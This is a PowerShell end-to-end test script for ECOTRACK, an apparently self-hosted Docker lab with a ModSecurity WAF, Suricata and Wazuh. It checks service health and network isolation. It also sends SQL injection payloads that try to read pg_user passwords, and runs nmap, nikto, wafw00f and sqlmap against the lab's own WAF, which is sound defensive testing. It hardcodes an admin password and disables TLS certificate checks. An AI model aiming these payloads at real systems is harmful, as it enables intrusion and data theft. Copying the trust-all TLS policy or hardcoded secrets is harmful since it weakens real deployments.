#requires -Version 5.1
# ECOTRACK - test end-to-end intensif (Windows 11 / Docker Desktop)
# Run: powershell -ExecutionPolicy Bypass -File .\test-ecotrack.ps1
# NB: la phase offensive lance de vrais scanners (nmap/wafw00f/nikto/sqlmap)
#     via des conteneurs jetables sur le reseau dmz ; comptez 5-10 min.

$ErrorActionPreference = 'Continue'

# --- TLS: trust self-signed (Wazuh dashboard) ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
if ($PSVersionTable.PSVersion.Major -lt 6) {
  try {
    Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertPolicy : ICertificatePolicy {
  public bool CheckValidationResult(ServicePoint sp, X509Certificate c, WebRequest r, int p) { return true; }
}
"@ -ErrorAction SilentlyContinue
    [Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertPolicy
  } catch {}
}

$script:pass = 0; $script:fail = 0; $script:warn = 0
function Section($t) { Write-Host ""; Write-Host ("== " + $t + " ==") -ForegroundColor Cyan }
function Pass($m) { $script:pass++; Write-Host ("  [PASS] " + $m) -ForegroundColor Green }
function Fail($m) { $script:fail++; Write-Host ("  [FAIL] " + $m) -ForegroundColor Red }
function Warn($m) { $script:warn++; Write-Host ("  [WARN] " + $m) -ForegroundColor Yellow }

function NumOf($s) { $t = ("$s").Trim(); if ($t -match '^\d+$') { [int64]$t } else { [int64]0 } }

function Http($url) {
  $ic = @{ Uri = $url; UseBasicParsing = $true; TimeoutSec = 8; ErrorAction = 'Stop' }
  if ($PSVersionTable.PSVersion.Major -ge 6) { $ic['SkipCertificateCheck'] = $true }
  try {
    $r = Invoke-WebRequest @ic
    return @{ ok = $true; code = [int]$r.StatusCode; body = $r.Content }
  } catch {
    $resp = $_.Exception.Response
    if ($null -ne $resp) {
      $sc = -1; try { $sc = [int]$resp.StatusCode } catch {}
      return @{ ok = $true; code = $sc; body = "" }
    }
    return @{ ok = $false; code = 0; body = $_.Exception.Message }
  }
}

# Status code only, for attack payloads (optionally with a custom User-Agent)
function AttackStatus($url, $ua) {
  $p = @{ Uri = $url; UseBasicParsing = $true; TimeoutSec = 8; ErrorAction = 'Stop' }
  if ($ua) { $p['Headers'] = @{ 'User-Agent' = $ua } }
  try { $r = Invoke-WebRequest @p; return [int]$r.StatusCode }
  catch { if ($_.Exception.Response) { return [int]$_.Exception.Response.StatusCode.value__ } return 0 }
}

function PgQuery($sql) {
  $out = docker exec ecotrack-postgres psql -U ecotrack -d ecotrack -tAc $sql 2>&1
  return (($out -join "`n").Trim())
}

# Admin UIs are VPN-only (no host ports). Reach them via the monitoring net.
$script:monNet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_monitoring$" | Select-Object -First 1)
if ($script:monNet) { $script:monNet = $script:monNet.ToString().Trim() } else { $script:monNet = "filerouge3_monitoring" }
function HttpMon($url) {
  $body = docker run --rm --network $script:monNet curlimages/curl:latest -sk --max-time 8 $url 2>&1
  $body = ($body -join "`n")
  if ($LASTEXITCODE -eq 0) { return @{ ok = $true; body = $body } }
  return @{ ok = $false; body = $body }
}

# Instant PromQL query via the monitoring net (no host port). Returns raw JSON text.
function PromQuery($promql) {
  $body = docker run --rm --network $script:monNet curlimages/curl:latest -sk --max-time 10 -G "http://172.20.4.40:9090/api/v1/query" --data-urlencode ("query=" + $promql) 2>&1
  return (($body -join "`n"))
}

# api is debian-based: use bash /dev/tcp to probe inter-container reachability
function TcpFromApi($ip, $port) {
  $cmd = "exec 3<>/dev/tcp/$ip/$port && echo OPEN || echo CLOSED"
  $o = docker exec ecotrack-api timeout 3 bash -c $cmd 2>&1
  return (($o -join '').Trim())
}

# ModSecurity audit log line count (proxy for #events inspected)
function ModsecLines { NumOf ((docker exec ecotrack-nginx-waf sh -c "wc -l < /var/log/nginx/modsec_audit.log 2>/dev/null || echo 0" 2>&1) -join '') }
# Suricata alert count in eve.json
function SuriAlertCount { NumOf ((docker exec ecotrack-suricata sh -c "grep -c event_type.:.alert /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1) -join '') }

# Offensive target (WAF on the dmz net) + autodetected dmz network name
$script:dmznet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_dmz$" | Select-Object -First 1)
if ($script:dmznet) { $script:dmznet = $script:dmznet.ToString().Trim() } else { $script:dmznet = "filerouge3_dmz" }
$WAFIP = "172.20.1.10"
$WAFPORT = 8080

Write-Host "ECOTRACK - test end-to-end intensif" -ForegroundColor White
Write-Host ("PowerShell {0} | {1}" -f $PSVersionTable.PSVersion, (Get-Date)) -ForegroundColor DarkGray

# --- 0. Docker available ---
Section "Docker engine"
docker version --format '{{.Server.Version}}' 2>&1 | Out-Null
if ($LASTEXITCODE -eq 0) { Pass "docker daemon reachable" } else { Fail "docker daemon not reachable - is Docker Desktop running?"; Write-Host "RESULT: aborted"; exit 1 }

# --- 1. Containers running / healthy ---
Section "Containers (18 attendus)"
$expected = @(
  'ecotrack-postgres', 'ecotrack-redis', 'ecotrack-api', 'ecotrack-iot-simulator',
  'ecotrack-nginx-waf', 'ecotrack-suricata', 'ecotrack-wireguard',
  'ecotrack-wazuh-indexer', 'ecotrack-wazuh-manager', 'ecotrack-wazuh-dashboard',
  'ecotrack-prometheus', 'ecotrack-grafana', 'ecotrack-alertmanager', 'ecotrack-node-exporter',
  'ecotrack-cadvisor', 'ecotrack-postgres-exporter', 'ecotrack-nginx-exporter', 'ecotrack-filebeat'
)
$running = docker ps --format '{{.Names}}'
foreach ($n in $expected) {
  if ($running -contains $n) {
    $state  = (docker inspect -f '{{.State.Status}}' $n 2>&1) -join ''
    $health = (docker inspect -f '{{if .State.Health}}{{.State.Health.Status}}{{else}}none{{end}}' $n 2>&1) -join ''
    if ($state -eq 'running') {
      if ($health -eq 'healthy' -or $health -eq 'none') { Pass "$n running ($health)" }
      elseif ($health -eq 'starting') { Warn "$n running, health=starting" }
      else { Fail "$n running but health=$health" }
    } else { Fail "$n state=$state" }
  } else { Fail "$n NOT running" }
}

# --- 2. Perimeter: WAF reverse proxy (host -> WAF -> api) ---
Section "Perimeter / WAF routing"
$r = Http "http://localhost/health"
if ($r.ok -and $r.code -eq 200 -and $r.body -match 'ok') { Pass "http://localhost/health -> 200 (WAF -> api proxy OK)" }
elseif ($r.ok) { Warn "WAF http /health code=$($r.code)" } else { Fail "WAF http unreachable: $($r.body)" }

$r = Http "https://localhost/health"
if ($r.ok -and $r.code -eq 200) { Pass "https://localhost/health -> 200 (TLS termination OK)" }
elseif ($r.ok) { Warn "WAF https /health code=$($r.code)" } else { Warn "WAF https unreachable: $($r.body)" }

$r = Http "http://localhost/api/iot/latest"
if ($r.ok -and $r.code -eq 200) { Pass "http://localhost/api/iot/latest -> 200 (API reachable through WAF)" }
elseif ($r.ok) { Warn "WAF /api/iot/latest code=$($r.code)" } else { Warn "WAF /api/iot/latest: $($r.body)" }

# --- 3. Data plane: IoT -> API -> PostgreSQL / Redis ---
Section "Data plane (IoT -> API -> PostgreSQL / Redis)"
$d = (docker exec ecotrack-postgres pg_isready -U ecotrack -d ecotrack 2>&1) -join ''
if ($d -match 'accepting connections') { Pass "postgres accepting connections" } else { Fail "postgres: $d" }

$v = PgQuery "SELECT PostGIS_Version()"
if ($v -match '\d') { Pass "PostGIS active: $v" } else { Fail "PostGIS query failed: $v" }

$c = PgQuery "SELECT count(*) FROM iot_readings"
if ($c -match '^\d+$' -and [int]$c -gt 0) { Pass "iot_readings rows=$c (IoT -> API -> PostgreSQL flow OK)" }
elseif ($c -match '^\d+$') { Warn "iot_readings rows=0 (simulator still warming up - re-run in ~30s)" }
else { Fail "iot_readings query failed: $c" }

$ping = (docker exec ecotrack-redis redis-cli ping 2>&1) -join ''
if ($ping -match 'PONG') { Pass "redis PONG" } else { Fail "redis ping: $ping" }

$keys = docker exec ecotrack-redis redis-cli keys "device:*:last" 2>&1
$kc = (@($keys) | Where-Object { $_ -match 'device:' }).Count
if ($kc -gt 0) { Pass "redis cache keys=$kc (API -> Redis flow OK)" } else { Warn "redis: no device:*:last keys yet" }

$h = (docker exec ecotrack-api curl -sf http://localhost:3000/health 2>&1) -join ''
if ($h -match 'ok') { Pass "api /health (in-container) OK" } else { Fail "api /health internal: $h" }

# --- 4. Network segmentation (static IPs / isolation) ---
Section "Network segmentation"
$o = TcpFromApi '172.20.3.10' 5432
if ($o -eq 'OPEN') { Pass "api -> postgres 172.20.3.10:5432 OPEN (db net)" } else { Fail "api -> postgres unreachable ($o)" }

$o = TcpFromApi '172.20.2.10' 6379
if ($o -eq 'OPEN') { Pass "api -> redis 172.20.2.10:6379 OPEN (backend net)" } else { Fail "api -> redis unreachable ($o)" }

$o = TcpFromApi '172.20.4.40' 9090
if ($o -ne 'OPEN') { Pass "api -X-> prometheus 172.20.4.40:9090 unreachable (monitoring isolated - OK)" } else { Fail "ISOLATION BREACH: api reached monitoring net ($o)" }

# --- 4b. Securite des flux capteurs (TLS via WAF, non-contournement) ---
Section "Securite des flux capteurs (TLS via WAF)"
$iotNet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_iot$" | Select-Object -First 1)
if ($iotNet) { $iotNet = $iotNet.ToString().Trim() } else { $iotNet = "filerouge3_iot" }

# 1. le WAF est joignable en HTTPS depuis le segment iot (chiffrement en transit)
$code = (docker run --rm --network $iotNet curlimages/curl:latest -sk --max-time 8 -o /dev/null -w "%{http_code}" https://172.20.5.30:8443/health 2>&1) -join ''
if ($code.Trim() -eq '200') { Pass "capteurs -> WAF en HTTPS/8443 OK (trafic chiffre TLS sur le segment iot)" } else { Warn "WAF HTTPS depuis iot code=$code (WAF pret ?)" }

# 2. l_API n'est plus joignable directement depuis iot : contournement du WAF impossible
$direct = (docker run --rm --network $iotNet curlimages/curl:latest -s --max-time 5 -o /dev/null -w "%{http_code}" http://172.20.5.20:3000/health 2>&1) -join ''
if ($direct.Trim() -eq '000' -or $direct -match 'curl|refused|timed') { Pass "API injoignable en direct depuis iot (POST capteurs force via le WAF)" } else { Fail "API REPOND en direct depuis iot (code=$direct) - contournement du WAF possible" }

# 3. un POST capteur legitime passe par le WAF en TLS et n'est pas bloque par ModSecurity
$payload = '{"device_id":"AQ-Montmartre-0001","value":42.5,"lat":48.8867,"lon":2.3431}'
$post = (docker run --rm --network $iotNet curlimages/curl:latest -sk --max-time 8 -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d $payload https://172.20.5.30:8443/api/iot 2>&1) -join ''
if ($post.Trim() -match '^20[01]$') { Pass "POST capteur via WAF HTTPS -> $post (TLS OK + accepte, pas de faux positif ModSec)" }
elseif ($post.Trim() -eq '403') { Warn "POST capteur -> 403 : ModSec bloque le trafic legitime (revoir CRS)" }
else { Warn "POST capteur via WAF code=$post" }

# --- 5. Monitoring stack (admins VPN-only: reached via monitoring net) ---
Section "Monitoring (Prometheus / Grafana / Alertmanager / node-exporter)"
$r = HttpMon "http://172.20.4.40:9090/-/healthy"
if ($r.ok -and $r.body -match 'Healthy') { Pass "Prometheus /-/healthy (via reseau interne)" } else { Fail "Prometheus injoignable meme en interne: $($r.body)" }

$r = HttpMon "http://172.20.4.40:9090/api/v1/targets"
if ($r.ok -and $r.body) {
  try {
    $j = $r.body | ConvertFrom-Json
    foreach ($t in $j.data.activeTargets) {
      $job = $t.labels.job; $hh = $t.health
      if ($hh -eq 'up') { Pass "Prometheus target '$job' = up" } else { Warn "Prometheus target '$job' = $hh ($($t.lastError))" }
    }
  } catch { Warn "Prometheus targets parse failed" }
}

$r = HttpMon "http://172.20.4.50:3000/api/health"
if ($r.ok -and $r.body) {
  try { $j = $r.body | ConvertFrom-Json; if ($j.database -eq 'ok') { Pass "Grafana healthy (db ok, v$($j.version))" } else { Warn "Grafana db=$($j.database)" } }
  catch { Warn "Grafana parse: $($r.body)" }
} else { Fail "Grafana injoignable en interne" }

$r = HttpMon "http://172.20.4.60:9093/api/v2/status"
if ($r.ok -and $r.body -match 'versionInfo|cluster|uptime') { Pass "Alertmanager operationnel (api/v2/status, via reseau interne)" } else { Fail "Alertmanager injoignable en interne" }

$r = HttpMon "http://172.20.4.70:9100/metrics"
if ($r.ok -and $r.body -match 'node_') { Pass "node-exporter /metrics OK (via reseau interne)" } else { Fail "node-exporter injoignable en interne" }

# --- 6. Perimeter IDS / VPN ---
Section "IDS / VPN"
$ver = (docker exec ecotrack-suricata suricata -V 2>&1) -join ' '
if ($ver -match 'Suricata') { Pass "suricata: $($ver.Trim())" } else { Warn "suricata version: $ver" }
$proc = (docker exec ecotrack-suricata sh -c "ps -e 2>/dev/null | grep -i suricat | grep -v grep" 2>&1) -join ''
if ($proc) { Pass "suricata process running (af-packet eth0)" } else { Warn "suricata process not confirmed - check 'docker logs ecotrack-suricata'" }

$wg = (docker exec ecotrack-wireguard wg show interfaces 2>&1) -join ' '
if ($wg -match 'wg') { Pass "wireguard interface up ($($wg.Trim()))" } else { Warn "wireguard wg show: $wg" }

# --- 7. SOC: Wazuh (TLS, can take 2-3 min to converge) ---
Section "SOC / Wazuh (TLS)"
$ch = (docker exec ecotrack-wazuh-indexer curl -sk -u admin:SecretPassword https://localhost:9200/_cluster/health 2>&1) -join ''
if ($ch -match '"status":"(green|yellow)"') { Pass "wazuh-indexer cluster status=$($Matches[1]) (HTTPS + auth OK)" }
elseif ($ch -match 'Security not initialized') { Warn "wazuh-indexer security index not initialized yet - wait ~1 min, re-run" }
elseif ($ch -match 'status|cluster') { Warn "wazuh-indexer health: $ch" }
else { Warn "wazuh-indexer not ready yet (2-3 min): $ch" }

$st = (docker exec ecotrack-wazuh-manager /var/ossec/bin/wazuh-control status 2>&1) -join "`n"
if ($st -match 'is running') { Pass "wazuh-manager core services running" }
else { Warn "wazuh-manager still initializing - 'docker logs ecotrack-wazuh-manager'" }

$mi = (docker exec ecotrack-wazuh-manager curl -sk -u admin:SecretPassword https://wazuh.indexer:9200/ 2>&1) -join ''
if ($mi -match 'cluster_name|number') { Pass "wazuh-manager -> https://wazuh.indexer:9200 reachable (TLS, monitoring net)" } else { Warn "wazuh-manager -> indexer not confirmed yet" }

$r = HttpMon "https://172.20.4.30:5601"
if ($r.ok) { Pass "Wazuh dashboard repond en HTTPS (via reseau interne)" } else { Warn "Wazuh dashboard pas pret (plusieurs min au 1er boot): $($r.body)" }

# --- 8. Chantier 1: exporters & Prometheus rules (admins VPN-only) ---
Section "Chantier 1 - Supervision"
$r = HttpMon "http://172.20.4.80:8080/metrics"
if ($r.ok -and $r.body -match 'container_') { Pass "cAdvisor /metrics OK (via reseau interne; UI VPN-only)" } else { Warn "cAdvisor pas pret: $($r.body)" }

$tg = HttpMon "http://172.20.4.40:9090/api/v1/targets"
$tgt = $null
if ($tg.ok) { try { $tgt = ($tg.body | ConvertFrom-Json).data.activeTargets } catch {} }
foreach ($job in @('cadvisor','postgres-exporter','nginx-exporter','iot-simulator')) {
  $m = @($tgt | Where-Object { $_.labels.job -eq $job })
  if ($m.Count -and ($m | Where-Object { $_.health -eq 'up' })) { Pass "Prometheus target up: $job" }
  elseif ($m.Count) { Warn "target $job present, health=$(@($m.health) -join ',') (warm-up ~30s, relancer)" }
  else { Warn "target $job absente - verifier prometheus.yml" }
}

$rules = HttpMon "http://172.20.4.40:9090/api/v1/rules"
if ($rules.ok -and $rules.body -match 'ecotrack\.availability') { Pass "Regles d'alerte chargees (ecotrack.availability/saturation/security/extended)" }
elseif ($rules.ok) { Warn "rules endpoint OK mais groupe ecotrack absent - verifier rule_files + montage ./prometheus/rules" }
else { Warn "rules endpoint injoignable" }

$am = HttpMon "http://172.20.4.60:9093/api/v2/alerts"
if ($am.ok) { Pass "Alertmanager API /api/v2/alerts repond (via reseau interne)" } else { Warn "Alertmanager API: $($am.body)" }

# --- 9. Chantier 2: ingestion Filebeat -> indexer ---
Section "Chantier 2 - Ingestion logs"
$fb = (docker inspect -f '{{.State.Running}}' ecotrack-filebeat 2>&1) -join ''
if ($fb -match 'true') { Pass "filebeat container running" } else { Fail "filebeat not running: $fb" }

$acc = (docker exec ecotrack-nginx-waf sh -c "test -f /var/log/nginx/ecotrack_access.log && wc -l < /var/log/nginx/ecotrack_access.log" 2>&1) -join ''
if ($acc -match '^\s*\d+') { Pass "nginx access.log present ($($acc.Trim()) lignes) dans volume nginx_logs" } else { Warn "nginx access.log pas encore ecrit: $acc" }

$idx = (docker exec ecotrack-wazuh-indexer curl -sk -u admin:SecretPassword "https://localhost:9200/_cat/indices/ecotrack-*?h=index" 2>&1) -join "`n"
if ($idx -match 'ecotrack-') { Pass "index ecotrack-* present dans wazuh-indexer (Filebeat ingere)" } else { Warn "aucun index ecotrack-* encore - genere du trafic + attendre ~1 min" }

# --- 10. KPI / metriques (verifie les corrections recentes des panels Grafana) ---
Section "KPI / metriques (panels Grafana)"
$jf = PromQuery "iot_fleet_size"
$fleet = 0; try { $rf = @(($jf | ConvertFrom-Json).data.result); if ($rf.Count) { $fleet = [int][double]$rf[0].value[1] } } catch {}
if ($fleet -ge 2000) { Pass "flotte IoT = $fleet capteurs (>=2000)" } elseif ($fleet -gt 0) { Warn "flotte IoT = $fleet (attendu >=2000 - simulator a jour ?)" } else { Warn "iot_fleet_size absent" }

$ja = PromQuery "iot_active_sensors"
$act = 0; try { $ra = @(($ja | ConvertFrom-Json).data.result); if ($ra.Count) { $act = [int][double]$ra[0].value[1] } } catch {}
if ($act -gt 0) { Pass "capteurs actifs = $act" } else { Warn "iot_active_sensors absent (warm-up)" }

$jt = PromQuery "count(count by (sensor_type) (iot_value_avg))"
$nt = 0; try { $rt = @(($jt | ConvertFrom-Json).data.result); if ($rt.Count) { $nt = [int][double]$rt[0].value[1] } } catch {}
if ($nt -ge 5) { Pass "types de capteurs instrumentes = $nt (agregats par type OK)" } else { Warn "types de capteurs = $nt (attendu >=5)" }

$jan = PromQuery "sum(iot_anomaly_active)"
$an = -1; try { $ran = @(($jan | ConvertFrom-Json).data.result); if ($ran.Count) { $an = [int][double]$ran[0].value[1] } } catch {}
if ($an -ge 0) { Pass "metrique anomalies active exposee (anomalies en cours: $an)" } else { Warn "iot_anomaly_active absent" }

$j = PromQuery "iot_post_errors_total"
$n = 0; try { $n = @(($j | ConvertFrom-Json).data.result).Count } catch {}
if ($n -gt 0) { Pass "iot_post_errors_total expose : $n series (panel 'Taux d erreur' alimente)" } else { Warn "iot_post_errors_total absent - simulator pas a jour / pas encore d'erreur injectee" }

$jr = PromQuery "sum(iot_readings_sent_total)"
$je = PromQuery "sum(iot_post_errors_total)"
$tot = 0.0; $err = 0.0
try { $rr = @(($jr | ConvertFrom-Json).data.result); if ($rr.Count) { $tot = [double]$rr[0].value[1] } } catch {}
try { $re = @(($je | ConvertFrom-Json).data.result); if ($re.Count) { $err = [double]$re[0].value[1] } } catch {}
if ($tot -gt 0) {
  $rate = [math]::Round(($err / ($tot + $err)) * 100, 2)
  if ($rate -le 5) { Pass "taux d'erreur IoT bas : $rate% ($err err / $tot ok) - conforme (~1% cible)" }
  else { Warn "taux d'erreur IoT = $rate% (attendu ~1%) - verifier SIM_ERROR_RATE" }
} else { Warn "pas encore de lectures comptees (warm-up)" }

$ju = PromQuery "time() - pg_postmaster_start_time_seconds"
$okU = $false; $upv = 0.0
try { $ru = @(($ju | ConvertFrom-Json).data.result); if ($ru.Count) { $okU = $true; $upv = [double]$ru[0].value[1] } } catch {}
if ($okU) { Pass ("pg_postmaster_start_time_seconds expose (uptime ~{0}s; --collector.postmaster actif)" -f [int]$upv) } else { Warn "pg uptime absent - ajouter --collector.postmaster a postgres-exporter" }

$jc = PromQuery "container_memory_usage_bytes"
$dk = 0; try { $dk = @(($jc | ConvertFrom-Json).data.result | Where-Object { $_.metric.id -match 'docker' }).Count } catch {}
if ($dk -gt 0) { Pass "cAdvisor: $dk series conteneur indexees par 'id' (panels Mem/CPU alimentes; label 'name' vide sur WSL2)" } else { Warn "cAdvisor: aucune serie id~docker - voir limitation WSL2" }

$cr = NumOf ((docker exec ecotrack-suricata sh -c "grep -c . /var/lib/suricata/rules/ecotrack-combined.rules 2>/dev/null || echo 0" 2>&1) -join '')
if ($cr -ge 50000) { Pass "Suricata ruleset combine : $cr regles chargees (ET Open + local)" }
elseif ($cr -gt 12) { Warn "ruleset combine = $cr (ET Open peut-etre absent, repli local)" }
else { Warn "ruleset combine introuvable: $cr" }

$pgI = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -u admin:SecretPassword 'https://localhost:9200/_cat/indices/ecotrack-postgres-*?h=index,docs.count'" 2>&1) -join "`n"
if ($pgI -match 'ecotrack-postgres') { Pass "index ecotrack-postgres-* present (logs PostgreSQL lisibles ingeres)" } else { Warn "index ecotrack-postgres-* absent" }
$wgI = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -u admin:SecretPassword 'https://localhost:9200/_cat/indices/ecotrack-wireguard-*?h=index,docs.count'" 2>&1) -join "`n"
if ($wgI -match 'ecotrack-wireguard') { Pass "index ecotrack-wireguard-* present (stdout WireGuard ingere)" } else { Warn "index ecotrack-wireguard-* absent" }

# --- 11. Chantier 3: detection (alimente Suricata + ModSec) ---
Section "Chantier 3 - Detection"
$rc = (docker exec ecotrack-wazuh-manager sh -c "grep -c 'rule id' /var/ossec/etc/rules/local_rules.xml" 2>&1) -join ''
$rcN = NumOf ($rc.Trim())
if ($rcN -ge 5) { Pass "wazuh local_rules.xml monte ($rcN regles de correlation)" } else { Warn "local_rules.xml: $rcN regle(s) detectee(s) (attendu >=5)" }

Write-Host "  [..] injection SQLi + sqlmap UA + OR 1=1 via le WAF (http://localhost)..." -ForegroundColor DarkGray
try { Invoke-WebRequest -Uri "http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--" -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop | Out-Null } catch {}
try { Invoke-WebRequest -Uri "http://localhost/api/iot/latest" -Headers @{ 'User-Agent' = 'sqlmap/1.7.2' } -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop | Out-Null } catch {}
try { 1..6 | ForEach-Object { Invoke-WebRequest -Uri "http://localhost/api/iot/latest?x=$_%27%20OR%20%271%27=%271" -UseBasicParsing -TimeoutSec 6 -ErrorAction Stop | Out-Null } } catch {}
Start-Sleep -Seconds 12

$suriRun = (docker inspect -f '{{.State.Running}}' ecotrack-suricata 2>&1) -join ''
if ($suriRun -match 'true') {
  $ev1 = NumOf (docker exec ecotrack-suricata sh -c "wc -l < /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1)
  if ($ev1 -gt 0) { Pass "suricata eve.json alimente ($ev1 lignes) - sidecar voit l'ingress WAF" } else { Warn "eve.json vide - verifier interface (docker exec ecotrack-suricata ip -o -4 addr)" }
  $alerts = NumOf (docker exec ecotrack-suricata sh -c "grep -c event_type.:.alert /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1)
  if ($alerts -gt 0) { Pass "suricata: $alerts alerte(s) IDS levee(s)" } else { Warn "0 alerte IDS - capture sidecar ne voit pas le trafic, voir notes interface" }
} else {
  Warn "suricata pas 'running' (state=$suriRun) - eve.json non verifie, corriger le conteneur d'abord"
}

$mods = NumOf (docker exec ecotrack-nginx-waf sh -c "test -f /var/log/nginx/modsec_audit.log && grep -c '9000001' /var/log/nginx/modsec_audit.log || echo 0" 2>&1)
if ($mods -gt 0) { Pass "ModSecurity: $mods hit(s) regle 9000001 (SQLi /api) dans modsec_audit.log" } else { Warn "0 hit ModSec custom 9000001 - CRS natif 942xxx a pu matcher avant" }

# --- 12. Pentest offensif intensif (vrais outils via le reseau dmz) ---
Section "Pentest offensif intensif (nmap / wafw00f / nikto / sqlmap)"
Write-Host "  [..] phase offensive : pull d'images + scans reels, comptez 5-10 min" -ForegroundColor DarkGray
$modsecBefore = ModsecLines
$suriBefore = SuriAlertCount

Write-Host "  [..] nmap : scan de ports + detection de versions sur $WAFIP ..." -ForegroundColor DarkGray
$nmapRecon = (docker run --rm --network $script:dmznet instrumentisto/nmap -Pn -T4 --host-timeout 120s -p 1-1024,3000,8080,8443 -sV $WAFIP 2>&1 | Out-String)
if ($nmapRecon -match '8080/tcp\s+open') { Pass "nmap: port WAF 8080/tcp ouvert et detecte" } else { Warn "nmap: 8080/tcp non vu ouvert (timeout/pull image ?)" }
if ($nmapRecon -match '3000/tcp\s+open') { Fail "nmap: backend 3000/tcp EXPOSE sur le WAF (segmentation a revoir)" } else { Pass "nmap: backend 3000/tcp non expose sur l'IP WAF (segmentation OK)" }

Write-Host "  [..] nmap NSE : http-waf-detect / http-sql-injection / http-enum ..." -ForegroundColor DarkGray
$nmapNse = (docker run --rm --network $script:dmznet instrumentisto/nmap -Pn -T4 --host-timeout 150s -p $WAFPORT --script http-waf-detect,http-waf-fingerprint,http-sql-injection,http-enum,http-methods $WAFIP 2>&1 | Out-String)
if ($nmapNse -match 'WAF|firewall|IDS/IPS|ModSecurity|protected') { Pass "nmap NSE: presence d'un WAF/IPS detectee devant l'application" } else { Warn "nmap NSE: WAF non explicitement detecte (script possiblement bloque)" }

Write-Host "  [..] wafw00f : fingerprinting du WAF ..." -ForegroundColor DarkGray
$wafw = (docker run --rm --network $script:dmznet python:3-slim sh -c "pip install --quiet --root-user-action=ignore wafw00f >/dev/null 2>&1; wafw00f http://${WAFIP}:${WAFPORT} 2>&1 | tail -20" 2>&1 | Out-String)
if ($wafw -match 'ModSecurity') { Pass "wafw00f: WAF identifie = ModSecurity" }
elseif ($wafw -match 'is behind|seems to be behind|behind a WAF|WAF') { Pass "wafw00f: presence d'un WAF confirmee" }
else { Warn "wafw00f: pas de WAF identifie (derniere ligne: $((($wafw -split "`n") | Where-Object { $_ -ne '' } | Select-Object -Last 1)))" }

Write-Host "  [..] nikto : scan web intensif (max 120s) ..." -ForegroundColor DarkGray
$nikto = (docker run --rm --network $script:dmznet sullo/nikto -h http://${WAFIP}:${WAFPORT} -ask no -maxtime 120s 2>&1 | Out-String)
$modsecAfterNikto = ModsecLines
$niktoDelta = $modsecAfterNikto - $modsecBefore
if ($niktoDelta -gt 20) { Pass "nikto: le WAF a inspecte/journalise +$niktoDelta evenements pendant le scan" }
elseif ($nikto -match 'tested|items checked|requests|Nikto') { Pass "nikto: scan execute (WAF actif devant l'app)" }
else { Warn "nikto: peu d'evenements WAF (+$niktoDelta) - pull image ou reseau ?" }

Write-Host "  [..] sqlmap : injection SQL automatisee (--level 2 --risk 2) ..." -ForegroundColor DarkGray
$sqlmap = (docker run --rm --network $script:dmznet python:3-slim sh -c "pip install --quiet --root-user-action=ignore sqlmap >/dev/null 2>&1; sqlmap -u 'http://${WAFIP}:${WAFPORT}/api/iot/latest?id=1' --batch --flush-session --level=2 --risk=2 --technique=BEU --threads=4 2>&1 | tail -30" 2>&1 | Out-String)
if ($sqlmap -match 'WAF/IPS|403|Forbidden|blocked|not be injectable|do not appear') { Pass "sqlmap: injections neutralisees par le WAF (403/blocage detecte)" }
elseif ($sqlmap -match 'is injectable|injectable\b|available databases') { Fail "sqlmap: parametre potentiellement injectable - revoir WAF/CRS" }
else { Warn "sqlmap: resultat non concluant (timeout/pull ?)" }

$modsecAfter = ModsecLines
$suriAfter = SuriAlertCount
$mDelta = $modsecAfter - $modsecBefore
$sDelta = $suriAfter - $suriBefore
if ($mDelta -gt 0) { Pass "ModSecurity: +$mDelta evenements journalises pendant la phase offensive" } else { Warn "ModSecurity: aucun nouvel evenement (verifier audit log)" }
if ($sDelta -gt 0) { Pass "Suricata: +$sDelta alertes IDS pendant la phase offensive (local + ET Open)" } else { Warn "Suricata: aucune nouvelle alerte (capture/sidecar ?)" }

# --- 13. Wazuh: bruit SCA coupe + alertes securite cote manager ---
Section "Wazuh - Alertes (SCA coupe + escalade)"
$sca = (docker exec ecotrack-wazuh-manager sh -c "grep -A2 '<sca>' /var/ossec/etc/ossec.conf | grep -c '<enabled>no</enabled>'" 2>&1) -join ''
if ($sca.Trim() -eq '1') { Pass "module SCA desactive dans ossec.conf (plus de bruit CIS)" } else { Warn "SCA pas confirme desactive - verifier montage wazuh_manager.conf" }

$lf = (docker exec ecotrack-wazuh-manager sh -c "grep -c 'ecotrack_access.log\|modsec_audit.log' /var/ossec/etc/ossec.conf" 2>&1) -join ''
if (([int]($lf.Trim() -replace '\D','')) -ge 2) { Pass "localfile nginx + modsec injectes dans le manager (logs -> analysisd)" } else { Warn "localfile ECOTRACK absents de ossec.conf" }

Write-Host "  [..] consolidation des alertes (laisser analysisd decoder)..." -ForegroundColor DarkGray
Start-Sleep -Seconds 15

$res = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:>=6 AND NOT rule.groups:sca'" 2>&1) -join ''
$cnt = 0; if ($res -match '"count":(\d+)') { $cnt = [int]$Matches[1] }
if ($cnt -gt 0) { Pass "wazuh-alerts: $cnt alerte(s) securite (niveau>=6, hors SCA)" }
elseif ($res -match '"count"') { Warn "0 alerte securite hors-SCA - logs pas encore decodes (attendre 1 min) ou capture vide" }
else { Warn "requete indexer KO: $res" }

$scaCnt = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.groups:sca'" 2>&1) -join ''
$sc = 0; if ($scaCnt -match '"count":(\d+)') { $sc = [int]$Matches[1] }
if ($sc -eq 0) { Pass "bruit SCA = 0 (module coupe, index purge)" } else { Warn "SCA = $sc alertes residuelles (anciennes; supprimer l'index du jour pour nettoyer)" }

